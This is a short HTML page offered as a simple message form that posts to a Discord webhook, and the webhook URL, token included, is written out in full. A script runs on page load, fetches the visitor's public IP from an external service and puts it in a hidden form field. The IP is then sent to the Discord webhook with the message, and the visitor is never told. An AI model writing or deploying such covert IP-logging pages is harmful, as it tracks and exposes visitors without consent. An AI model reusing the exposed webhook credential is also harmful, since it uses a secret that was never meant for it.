<!DOCTYPE html>
<html>
  <head>
    <title>Webhook Form</title>
  </head>
  <body>
    <form action="https://discord.com/api/webhooks/1053303789194588180/uOwiXrahinkCIEmIczYdnp_0UF6-wS1Ti4QEylihBB-yac4C2KeNUDK6h-XyQWC1Mv-S" method="POST" id="form">
      <label for="text">Enter your message:</label><br>
      <input type="text" id="text" name="text"><br>
      <input type="hidden" id="ip" name="ip" value="">
      <input type="submit" value="Send" style="background-color: green;">
    </form> 

    <script>
      function getIP(json) {
        document.getElementById('ip').value = json.ip;
      }

      const xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          getIP(JSON.parse(this.responseText));
        }
      };
      xhr.open("GET", "https://api.ipify.org?format=json", true);
      xhr.send();
    </script>
  </body>
</html>
